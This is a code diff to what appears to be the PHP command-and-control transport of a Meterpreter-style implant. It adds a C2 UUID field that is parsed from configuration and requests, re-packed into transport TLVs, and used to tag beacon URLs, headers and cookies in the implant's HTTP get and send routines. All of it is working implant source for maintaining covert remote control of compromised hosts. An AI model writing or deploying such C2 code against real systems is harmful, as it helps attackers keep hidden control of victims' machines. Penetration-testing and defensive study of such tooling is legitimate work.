@@ -761,12 +761,12 @@ if (!function_exists('core_patch_uuid')) {
     $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
     if ($tlv == null) { return ERROR_FAILURE; }
     $new_uuid = $tlv['value'];
+    $transport['c2_uuid'] = $new_uuid;
     $parts = parse_url($transport['url']);
-    if (!isset($parts['scheme']) || !isset($parts['host'])) {
-      return ERROR_FAILURE;
+    if (isset($parts['scheme']) && isset($parts['host'])) {
+      $port = isset($parts['port']) ? ':' . $parts['port'] : '';
+      $transport['url'] = $parts['scheme'] . '://' . $parts['host'] . $port . '/' . $new_uuid;
     }
-    $port = isset($parts['port']) ? ':' . $parts['port'] : '';
-    $transport['url'] = $parts['scheme'] . '://' . $parts['host'] . $port . '/' . $new_uuid;
     return ERROR_SUCCESS;
   }
 }
@@ -1353,6 +1353,8 @@ function parse_config_block($raw) {
       $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
       $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_HEADERS);
       $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
+      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_UUID);
+      $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;
 
       $get_group = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_GET);
       $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
@@ -1425,6 +1427,8 @@ function parse_transport_from_request($req) {
     $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
     $tlv = packet_get_tlv($req, TLV_TYPE_C2_HEADERS);
     $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
+    $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;
 
     $get_group = packet_get_tlv($req, TLV_TYPE_C2_GET);
     $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
@@ -1447,6 +1451,9 @@ function tlv_pack_transport_group($t) {
     }
     if (!empty($t['proxy_url'])) {
       $group .= tlv_pack(create_tlv(TLV_TYPE_C2_PROXY_URL, $t['proxy_url']));
+    }
+    if (!empty($t['c2_uuid'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UUID, $t['c2_uuid']));
     }
   }
   return $group;
@@ -2010,7 +2017,16 @@ function http_get_uuid_from_url($url) {
   return end($parts);
 }
 
-function http_build_profile_url($base_url, $profile) {
+function http_transport_uuid($transport) {
+  # Prefer TLV_TYPE_C2_UUID; fall back to URL path's last segment.
+  if (!empty($transport['c2_uuid'])) {
+    return $transport['c2_uuid'];
+  }
+  return http_get_uuid_from_url($transport['url']);
+}
+
+function http_build_profile_url($transport, $profile) {
+  $base_url = $transport['url'];
   if ($profile == null || !isset($profile['uri']) || $profile['uri'] == null) {
     return $base_url;
   }
@@ -2022,7 +2038,7 @@ function http_build_profile_url($base_url, $profile) {
   $url .= $uri;
 
   if (isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
-    $uuid = http_get_uuid_from_url($base_url);
+    $uuid = http_transport_uuid($transport);
     if (strlen($uuid) > 0) {
       $sep = (strpos($url, '?') !== false) ? '&' : '?';
       $url .= $sep . $profile['uuid_get'] . '=' . $uuid;
@@ -2041,13 +2057,13 @@ function http_build_context($transport, $profile, $body = null) {
   }
   if ($profile != null) {
     if (isset($profile['uuid_header']) && $profile['uuid_header'] != null) {
-      $uuid = http_get_uuid_from_url($transport['url']);
+      $uuid = http_transport_uuid($transport);
       if (strlen($uuid) > 0) {
         $headers .= $profile['uuid_header'] . ': ' . $uuid . "\r\n";
       }
     }
     if (isset($profile['uuid_cookie']) && $profile['uuid_cookie'] != null) {
-      $uuid = http_get_uuid_from_url($transport['url']);
+      $uuid = http_transport_uuid($transport);
       if (strlen($uuid) > 0) {
         $headers .= "Cookie: " . $profile['uuid_cookie'] . '=' . $uuid . "\r\n";
       }
@@ -2087,7 +2103,7 @@ function http_build_context($transport, $profile, $body = null) {
 
 function http_get_packet($transport) {
   $profile = $transport['c2_get'];
-  $url = http_build_profile_url($transport['url'], $profile);
+  $url = http_build_profile_url($transport, $profile);
   $ctx = http_build_context($transport, $profile);
 
   $raw = @file_get_contents($url, false, $ctx);
@@ -2120,7 +2136,7 @@ function http_send_packet($transport, $packet) {
     }
   }
 
-  $url = http_build_profile_url($transport['url'], $profile);
+  $url = http_build_profile_url($transport, $profile);
   $ctx = http_build_context($transport, $profile, $body);
 
   @file_get_contents($url, false, $ctx);
